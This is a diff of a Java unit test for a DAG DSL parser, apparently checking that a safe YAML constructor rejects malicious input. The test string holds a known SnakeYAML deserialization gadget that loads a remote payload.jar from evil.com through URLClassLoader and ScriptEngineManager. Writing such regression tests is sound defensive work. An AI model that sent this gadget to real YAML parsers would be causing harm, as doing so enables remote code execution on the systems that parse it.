@@ -9,6 +9,9 @@ import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
 import com.njydsz.agent.domain.agent.AgentDag;
 
+import java.net.URL;
+import java.net.URLClassLoader;
+import javax.script.ScriptEngineManager;
 /**
  * {@link DagDslParser} 单元测试。
  *
@@ -144,7 +147,7 @@ class DagDslParserTest {
             String maliciousYaml = """
                     name: attack
                     nodes:
-                      evil: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/payload.jar"]]]]
+                      evil: !!ScriptEngineManager [!!URLClassLoader [[!!URL ["http://evil.com/payload.jar"]]]]
                     """;
 
             // SafeConstructor 会抛出异常或忽略恶意标签，而非执行任意代码
